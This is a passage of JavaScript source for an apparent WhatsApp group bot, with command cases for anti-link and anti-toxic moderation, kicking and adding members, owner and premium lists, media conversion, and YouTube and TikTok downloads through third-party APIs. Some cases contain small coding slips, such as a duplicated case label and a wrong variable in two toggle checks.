      case "antilinktiktok":
      case "antilinktt":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (AntiLinkTiktok) return replygcxeon("Already activated");
            ntilinktt.push(from);
            fs.writeFileSync(
              "./database/antilinktiktok.json",
              JSON.stringify(ntilinktt)
            );
            replygcxeon("Success in turning on tiktok antilink in this group");
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTiktok) return replygcxeon("Already deactivated");
            let off = ntilinktt.indexOf(from);
            ntilinktt.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinktiktok.json",
              JSON.stringify(ntilinktt)
            );
            replygcxeon("Success in turning off tiktok antilink in this group");
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinktwt":
      case "antilinktwitter":
      case "antilinktwit":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (AntiLinkTwitter) return replygcxeon("Already activated");
            ntilinktwt.push(from);
            fs.writeFileSync(
              "./database/antilinktwitter.json",
              JSON.stringify(ntilinktwt)
            );
            replygcxeon("Success in turning on twitter antilink in this group");
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTwitter) return replygcxeon("Already deactivated");
            let off = ntilinktwt.indexOf(from);
            ntilinktwt.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinktwitter.json",
              JSON.stringify(ntilinktwt)
            );
            replygcxeon(
              "Success in turning off twitter antilink in this group"
            );
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkall":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (AntiLinkTwitter) return replygcxeon("Already activated");
            ntilinkall.push(from);
            fs.writeFileSync(
              "./database/antilinkall.json",
              JSON.stringify(ntilinkall)
            );
            replygcxeon("Success in turning on all antilink in this group");
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkAll) return replygcxeon("Already deactivated");
            let off = ntilinkall.indexOf(from);
            ntilinkall.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkall.json",
              JSON.stringify(ntilinkall)
            );
            replygcxeon("Success in turning off all antilink in this group");
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antitoxic":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (antiToxic) return replygcxeon("Already activated");
            nttoxic.push(from);
            fs.writeFileSync(
              "./database/antitoxic.json",
              JSON.stringify(nttoxic)
            );
            replygcxeon("Success in turning on antitoxic in this group");
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!antiToxic) return replygcxeon("Already deactivated");
            let off = nttoxic.indexOf(from);
            nttoxic.splice(off, 1);
            fs.writeFileSync(
              "./database/antitoxic.json",
              JSON.stringify(nttoxic)
            );
            replygcxeon("Success in turning off antitoxic in this group");
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antiwame":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (antiWame) return replygcxeon("Already activated");
            ntwame.push(from);
            fs.writeFileSync(
              "./database/antiwame.json",
              JSON.stringify(ntwame)
            );
            replygcxeon("Success in turning on antiwame in this group");
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!antiWame) return replygcxeon("Already deactivated");
            let off = nttoxic.indexOf(from);
            ntwame.splice(off, 1);
            fs.writeFileSync(
              "./database/antiwame.json",
              JSON.stringify(ntwame)
            );
            replygcxeon("Success in turning off antiwame in this group");
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkgc":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (Antilinkgc) return replygcxeon("Already activated");
            ntlinkgc.push(from);
            fs.writeFileSync(
              "./database/antilinkgc.json",
              JSON.stringify(ntlinkgc)
            );
            replygcxeon("Success in turning on antiwame in this group");
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!Antilinkgc) return replygcxeon("Already deactivated");
            let off = ntlinkgc.indexOf(from);
            ntlinkgc.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkgc.json",
              JSON.stringify(ntlinkgc)
            );
            replygcxeon("Success in turning off antiwame in this group");
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "leavegc":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          await XeonBotInc.groupLeave(m.chat)
            .then((res) => replygcxeon(jsonformat(res)))
            .catch((err) => replygcxeon(jsonformat(err)));
        }
        break;
      case "add":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          let users = m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await XeonBotInc.groupParticipantsUpdate(m.chat, [users], "add")
            .then((res) => replygcxeon(jsonformat(res)))
            .catch((err) => replygcxeon(jsonformat(err)));
        }
        break;
      case "closetime":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (args[1] == "second") {
            var timer = args[0] * `1000`;
          } else if (args[1] == "minute") {
            var timer = args[0] * `60000`;
          } else if (args[1] == "hour") {
            var timer = args[0] * `3600000`;
          } else if (args[1] == "day") {
            var timer = args[0] * `86400000`;
          } else {
            return replygcxeon(
              "*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second"
            );
          }
          replygcxeon(`Close Time ${q} Starting from now`);
          setTimeout(() => {
            var nomor = m.participant;
            const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`;
            XeonBotInc.groupSettingUpdate(from, "announcement");
            replygcxeon(close);
          }, timer);
        }
        break;
      case "delete":
      case "del":
        {
          if (!m.quoted) throw false;
          let { chat, fromMe, id, isBaileys } = m.quoted;
          if (!isBaileys)
            return replygcxeon("The message was not sent by a bot!");
          XeonBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: true,
              id: m.quoted.id,
              participant: m.quoted.sender,
            },
          });
        }
        break;
      case "linkgroup":
      case "linkgc":
      case "gclink":
      case "grouplink":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          let response = await XeonBotInc.groupInviteCode(m.chat);
          XeonBotInc.sendText(
            m.chat,
            `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`,
            m,
            { detectLink: true }
          );
        }
        break;
      case "opentime":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (args[1] == "second") {
            var timer = args[0] * `1000`;
          } else if (args[1] == "minute") {
            var timer = args[0] * `60000`;
          } else if (args[1] == "hour") {
            var timer = args[0] * `3600000`;
          } else if (args[1] == "day") {
            var timer = args[0] * `86400000`;
          } else {
            return replygcxeon(
              "*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second"
            );
          }
          replygcxeon(`Open Time ${q} Starting from now`);
          setTimeout(() => {
            var nomor = m.participant;
            const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`;
            XeonBotInc.groupSettingUpdate(from, "not_announcement");
            replygcxeon(open);
          }, timer);
        }
        break;
      case "kick":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await XeonBotInc.groupParticipantsUpdate(m.chat, [users], "remove")
            .then((res) => replygcxeon(jsonformat(res)))
            .catch((err) => replygcxeon(jsonformat(err)));
        }
        break;
      case "setname":
      case "setsubject":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins) return replygcxeon(mess.admin);
          if (!text) return replygcxeon("Text ?");
          await XeonBotInc.groupUpdateSubject(m.chat, text)
            .then((res) => replygcxeon(mess.success))
            .catch((err) => replygcxeon(jsonformat(err)));
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins) return replygcxeon(mess.admin);
          if (!text) return replygcxeon("Text ?");
          await XeonBotInc.groupUpdateDescription(m.chat, text)
            .then((res) => replygcxeon(mess.success))
            .catch((err) => replygcxeon(jsonformat(err)));
        }
        break;
      case "setppgroup":
      case "setgcpp":
      case "setgrouppp":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!quoted) return replygcxeon(`Where is the picture?`);
          if (!/image/.test(mime))
            return replygcxeon(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          if (/webp/.test(mime))
            return replygcxeon(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          var mediz = await XeonBotInc.downloadAndSaveMediaMessage(
            quoted,
            "ppgc.jpeg"
          );
          if (args[0] == `/panjang`) {
            var { img } = await generateProfilePicture(mediz);
            await XeonBotInc.query({
              tag: "iq",
              attrs: {
                to: m.chat,
                type: "set",
                xmlns: "w:profile:picture",
              },
              content: [
                {
                  tag: "picture",
                  attrs: { type: "image" },
                  content: img,
                },
              ],
            });
            fs.unlinkSync(mediz);
            replygcxeon(`Success`);
          } else {
            var memeg = await XeonBotInc.updateProfilePicture(m.chat, {
              url: mediz,
            });
            fs.unlinkSync(mediz);
            replygcxeon(`Success`);
          }
        }
        break;
      case "tagall":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          me = m.sender;
          let teks = ` 
 😶 *Tagger :*  @${me.split("@")[0]}
 🌿 *Message : ${q ? q : "no message"}*\n\n`;
          for (let mem of participants) {
            teks += `${themeemoji} @${mem.id.split("@")[0]}\n`;
          }
          XeonBotInc.sendMessage(
            m.chat,
            { text: teks, mentions: participants.map((a) => a.id) },
            { quoted: m }
          );
        }
        break;
      case "fbdl":
      case "facebook":
        {
          if (!q) return replygcxeon(`Where's the link??`);
          let anu = await fetchJson(
            `https://api.zexxadev.repl.co/api/dowloader/fbdown?url=${q}`
          );
          XeonBotInc.sendMessage(
            m.chat,
            { video: { url: anu.result.HD }, caption: "Here you go!." },
            { quoted: m }
          );
        }
        break;
      case "jadianime":
        {
          if (!quoted) return replygcxeon(`Where is the picture?`);
          if (!/image/.test(mime))
            return replygcxeon(
              `Send/Reply Photos With Captions ${prefix + command}`
            );
          replygcxeon(mess.wait);
          media = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
          mem = await uptotelegra(media);
          try {
            let proses = await fetchJson(
              `https://api.zexxadev.repl.co/api/tools/toanime?url=${mem}`
            );
            image_url = proses["result"]["image_data"];
            if (!image_url) return replygcxeon(mess.error);
            if (proses.status == false) return replygcxeon(mess.error);
            XeonBotInc.sendMessage(
              m.chat,
              { image: { url: image_url }, caption: mess.success },
              { quoted: m }
            );
            await fs.unlinkSync(media);
          } catch (err) {
            console.log(err);
            return replygcxeon(mess.error);
          }
        }
        break;
      case "jadianime":
        {
          if (!quoted) return replygcxeon(`Where is the picture?`);
          if (!/image/.test(mime))
            return replygcxeon(
              `Send/Reply Photos With Captions ${prefix + command}`
            );
          replygcxeon(mess.wait);
          media = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
          mem = await uptotelegra(media);
          try {
            let proses = await fetchJson(
              `https://api.akuari.my.id/search/whatanime?link=${mem}`
            );
            if (!proses) return replygcxeon(mess.error);
            if (proses.status == false) return replygcxeon(mess.error);
            XeonBotInc.sendMessage(
              m.chat,
              { text: proses.hasil.result[0].filename },
              { quoted: m }
            );
            await fs.unlinkSync(media);
          } catch (err) {
            console.log(err);
            return replygcxeon(mess.error);
          }
        }
        break;
      case "removebg":
        {
          if (!quoted) return replygcxeon(`Where is the picture?`);
          if (!/image/.test(mime))
            return replygcxeon(
              `Send/Reply Photos With Captions ${prefix + command}`
            );
          replygcxeon(mess.wait);
          media = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
          mem = await uptotelegra(media);
          try {
            let proses = await fetchJson(
              `https://api.zexxadev.repl.co/api/tools/removebg?url=${mem}`
            );
            image_url = proses["result"]["image_data"];
            if (!image_url) return replygcxeon(mess.error);
            if (proses.status == false) return replygcxeon(mess.error);
            XeonBotInc.sendMessage(
              m.chat,
              { image: { url: image_url }, caption: mess.success },
              { quoted: m }
            );
            await fs.unlinkSync(media);
          } catch (err) {
            console.log(err);
            return replygcxeon(mess.error);
          }
        }
        break;
      case "smeme":
        {
          let [atas, bawah] = text.split`|`;
          //let q = m.quoted ? m.quoted : m;
          if (!/image/.test(mime))
            return replygcxeon(
              `Send/Reply Photos With Captions ${prefix + command} text1|text2`
            );
          replygcxeon(mess.wait);
          let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
          let url = await uptotelegra(media);
          let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(
            atas ? atas : ""
          )}/${encodeURIComponent(bawah ? bawah : "")}.png?background=${url}`;
          await XeonBotInc.sendImageAsSticker(m.chat, meme, m, {
            packname: global.packname,
            author: global.author,
          });
          await fs.unlinkSync(media);
        }
        break;
      case "tiktok":
        {
          if (!text) return replygcxeon(`Example : ${prefix + command} link`);
          if (!q.includes("tiktok")) return replygcxeon(`Link Invalid!!`);
          replygcxeon(mess.wait);
          require("./lib/tiktok")
            .Tiktok(q)
            .then((data) => {
              XeonBotInc.sendMessage(
                m.chat,
                { caption: `Here you go!`, video: { url: data.watermark } },
                { quoted: m }
              );
            });
        }
        break;
      case "google":
        {
          if (!q)
            return replygcxeon(`Example : ${prefix + command} ${botname}`);
          replygcxeon(mess.wait);
          let google = require("google-it");
          google({ query: text }).then((res) => {
            let teks = `Google Search From : ${text}\n\n`;
            for (let g of res) {
              teks += `⭔ *Title* : ${g.title}\n`;
              teks += `⭔ *Description* : ${g.snippet}\n`;
              teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`;
            }
            replygcxeon(teks);
          });
        }
        break;
      case "search":
      case "yts":
      case "ytsearch":
        {
          if (!text)
            return replygcxeon(`Example : ${prefix + command} story wa anime`);
          let yts = require("yt-search");
          let search = await yts(text);
          let teks = "YouTube Search\n\n Result From " + text + "\n\n";
          let no = 1;
          for (let i of search.all) {
            teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${
              i.type
            }\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${
              i.title
            }\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${
              i.timestamp
            }\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${
              i.url
            }\n\n─────────────────\n\n`;
          }
          XeonBotInc.sendMessage(
            m.chat,
            { image: { url: search.all[0].thumbnail }, caption: teks },
            { quoted: m }
          );
        }
        break;
      case "play":
      case "song":
      case "ytmp3":
        {
          if (!text)
            return replygcxeon(
              `Example : ${prefix + command} kufaku cuma kamu`
            );
          const xeonplaymp3 = require("./lib/ytdl2");
          const { fetchBuffer } = require("./lib/myfunc2");
          let yts = require("youtube-yts");
          let search = await yts(text);
          let anup3k = search.videos[0];
          const pl = await xeonplaymp3.mp3(anup3k.url);
          await XeonBotInc.sendMessage(
            m.chat,
            {
              audio: fs.readFileSync(pl.path),
              fileName: anup3k.title + ".mp3",
              mimetype: "audio/mp4",
              ptt: true,
              contextInfo: {
                externalAdReply: {
                  title: anup3k.title,
                  body: botname,
                  thumbnail: await fetchBuffer(pl.meta.image),
                  mediaType: 2,
                  mediaUrl: anup3k.url,
                },
              },
            },
            { quoted: m }
          );
          await fs.unlinkSync(pl.path);
        }
        break;
      case "ytmp4":
      case "ytvideo":
        {
          const xeonvidoh = require("./lib/ytdl2");
          if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text))
            replygcxeon(
              `Where is the link??\n\nExample : ${
                prefix + command
              } https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
            );
          const vid = await xeonvidoh.mp4(text);
          const ytc = `
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`;
          await XeonBotInc.sendMessage(
            m.chat,
            {
              video: { url: vid.videoUrl },
              caption: ytc,
            },
            { quoted: m }
          );
        }
        break;
      case "getcase":
        if (!XeonTheCreator) return replygcxeon(mess.owner);
        const getCase = (cases) => {
          return (
            "case" +
            `'${cases}'` +
            fs
              .readFileSync("XeonCheems7.js")
              .toString()
              .split("case '" + cases + "'")[1]
              .split("break")[0] +
            "break"
          );
        };
        replygcxeon(`${getCase(q)}`);
        break;
      case "addprem":
        if (!XeonTheCreator) return replygcxeon(mess.owner);
        if (!args[0])
          return replygcxeon(
            `Use ${prefix + command} number\nExample ${
              prefix + command
            } 6283897387848`
          );
        prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + `@s.whatsapp.net`;
        let ceknya = await XeonBotInc.onWhatsApp(prrkek);
        if (ceknya.length == 0)
          return replygcxeon(
            `Enter a valid and registered number on WhatsApp!!!`
          );
        prem.push(prrkek);
        fs.writeFileSync("./database/premium.json", JSON.stringify(prem));
        replygcxeon(`The Number ${prrkek} Has Been Premium!`);
        break;
      case "delprem":
        if (!XeonTheCreator) return replygcxeon(mess.owner);
        if (!args[0])
          return replygcxeon(
            `Use ${prefix + command} nomor\nExample ${
              prefix + command
            } 6283897387848`
          );
        ya = q.split("|")[0].replace(/[^0-9]/g, "") + `@s.whatsapp.net`;
        unp = prem.indexOf(ya);
        prem.splice(unp, 1);
        fs.writeFileSync("./database/premium.json", JSON.stringify(prem));
        replygcxeon(`The Number ${ya} Has Been Removed Premium!`);
        break;
      case "addbadword":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          if (args.length < 1) return replygcxeon("Whats the word?");
          if (BadXeon.includes(q))
            return replygcxeon("The word is already in use");
          BadXeon.push(q);
          fs.writeFileSync("./database/bad.json", JSON.stringify(BadXeon));
          replygcxeon(
            `Success Adding Bad Word\nCheck by typing ${prefix}listbadword`
          );
        }
        break;
      case "delbadword":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          if (args.length < 1) return replygcxeon("Enter the word");
          if (!BadXeon.includes(q))
            return replygcxeon("The word does not exist in the database");
          let wanu = BadXeon.indexOf(q);
          BadXeon.splice(wanu, 1);
          fs.writeFileSync("./database/bad.json", JSON.stringify(BadXeon));
          replygcxeon(`Success deleting bad word ${q}`);
        }
        break;
      case "listbadword":
        {
          let teks = "┌──⭓「 *BadWord List* 」\n│\n";
          for (let x of BadXeon) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${BadXeon.length}*`;
          replygcxeon(teks);
        }
        break;
      case "addowner":
        if (!XeonTheCreator) return replygcxeon(mess.owner);
        if (!args[0])
          return replygcxeon(
            `Use ${prefix + command} number\nExample ${
              prefix + command
            } ${ownernumber}`
          );
        bnnd = q.split("|")[0].replace(/[^0-9]/g, "");
        let ceknye = await XeonBotInc.onWhatsApp(bnnd);
        if (ceknye.length == 0)
          return replygcxeon(
            `Enter A Valid And Registered Number On WhatsApp!!!`
          );
        owner.push(bnnd);
        fs.writeFileSync("./database/owner.json", JSON.stringify(owner));
        replygcxeon(`Number ${bnnd} Has Become An Owner!!!`);
        break;
      case "delowner":
        if (!XeonTheCreator) return replygcxeon(mess.owner);
        if (!args[0])
          return replygcxeon(
            `Use ${prefix + command} nomor\nExample ${
              prefix + command
            } 6283897387848`
          );
        ya = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = owner.indexOf(ya);
        owner.splice(unp, 1);
        fs.writeFileSync("./database/owner.json", JSON.stringify(owner));
        replygcxeon(
          `The Numbrr ${ya} Has been deleted from owner list by the owner!!!`
        );
        break;
      case "listpremium":
      case "listprem":
        teks = "*Premium List*\n\n";
        for (let XeonBotInc of prem) {
          teks += `- ${XeonBotInc}\n`;
        }
        teks += `\n*Total : ${prem.length}*`;
        XeonBotInc.sendMessage(
          m.chat,
          { text: teks.trim() },
          "extendedTextMessage",
          { quoted: m, contextInfo: { mentionedJid: prem } }
        );
        break;
      case "setexif":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          if (!text)
            return replygcxeon(`Example : ${prefix + command} packname|author`);
          global.packname = text.split("|")[0];
          global.author = text.split("|")[1];
          replygcxeom(
            `Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`
          );
        }
        break;
      case "setppbot":
      case "setbotpp":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          if (!quoted)
            return replygcxeon(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          if (!/image/.test(mime))
            return replygcxeon(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          if (/webp/.test(mime))
            return replygcxeon(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          var medis = await XeonBotInc.downloadAndSaveMediaMessage(
            quoted,
            "ppbot.jpeg"
          );
          if (args[0] == `/panjang`) {
            var { img } = await generateProfilePicture(medis);
            await XeonBotInc.query({
              tag: "iq",
              attrs: {
                to: botNumber,
                type: "set",
                xmlns: "w:profile:picture",
              },
              content: [
                {
                  tag: "picture",
                  attrs: { type: "image" },
                  content: img,
                },
              ],
            });
            fs.unlinkSync(medis);
            replygcxeon(`Success`);
          } else {
            var memeg = await XeonBotInc.updateProfilePicture(botNumber, {
              url: medis,
            });
            fs.unlinkSync(medis);
            replygcxeon(`Success`);
          }
        }
        break;
      case "tomp4":
      case "tovideo":
        {
          if (!quoted) return replygcxeon("Reply Image");
          if (!/webp/.test(mime))
            return replygcxeon(
              `reply sticker with caption *${prefix + command}*`
            );
          replygcxeon(mess.wait);
          let { webp2mp4File } = require("./lib/uploader");
          let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
          let webpToMp4 = await webp2mp4File(media);
          await XeonBotInc.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
            },
            { quoted: m }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "tomp3":
        {
          if (/document/.test(mime))
            return replygcxeon(
              `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${
                prefix + command
              }`
            );
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replygcxeon(
              `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${
                prefix + command
              }`
            );
          if (!quoted)
            return replygcxeon(
              `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${
                prefix + command
              }`
            );
          replygcxeon(mess.wait);
          let media = await quoted.download();
          let { toAudio } = require("./lib/converter");
          let audio = await toAudio(media, "mp4");
          XeonBotInc.sendMessage(
            m.chat,
            {
              document: audio,
              mimetype: "audio/mpeg",
              fileName: `Convert By ${XeonBotInc.user.name}.mp3`,
            },
            { quoted: m }
          );
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replygcxeon(
              `Reply Video/Audio That You Want To Be VN With Caption ${
                prefix + command
              }`
            );
          if (!quoted)
            return replygcxeon(
              `Reply Video/Audio That You Want To Be VN With Caption ${
                prefix + command
              }`
            );
          replygcxeon(mess.wait);
          let media = await quoted.download();
          let { toPTT } = require("./lib/converter");
          let audio = await toPTT(media, "mp4");
          XeonBotInc.sendMessage(
            m.chat,
            { audio: audio, mimetype: "audio/mpeg", ptt: true },
            { quoted: m }
          );
        }
        break;
      case "toqr":
        {
          if (!q) return replygcxeon(" Please include link or text!");
          const QrCode = require("qrcode-reader");
          const qrcode = require("qrcode");
          let qyuer = await qrcode.toDataURL(q, { scale: 35 });
          let data = new Buffer.from(
            qyuer.replace("data:image/png;base64,", ""),
            "base64"
          );
          let buff = getRandom(".jpg");
          await fs.writeFileSync("./" + buff, data);
          let medi = fs.readFileSync("./" + buff);
          await XeonBotInc.sendMessage(
            from,
            { image: medi, caption: "Here you go!" },
            { quoted: m }
          );
          setTimeout(() => {
            fs.unlinkSync(buff);
          }, 10000);
        }
        break;
      case "toimg":
        {
          if (!/webp/.test(mime))
            return replygcxeon(
              `balas stiker dengan caption *${prefix + command}*`
            );
          let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
          let ran = await getRandom(".png");
          exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media);
            if (err) return replygcxeon(err);
            let buffer = fs.readFileSync(ran);
            XeonBotInc.sendMessage(
              m.chat,
              { image: buffer, jpegThumbnail: defaultpp },
              { quoted: m }
            );
            fs.unlinkSync(ran);
          });
        }
        break;
      case "sticker":
        {
          if (!quoted)
            return replygcxeon(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          if (/image/.test(mime)) {
            let media = await quoted.download();
            let encmedia = await XeonBotInc.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
            await fs.unlinkSync(encmedia);
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return replygcxeon(
                "Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds"
              );
            let media = await quoted.download();
            let encmedia = await XeonBotInc.sendVideoAsSticker(
              m.chat,
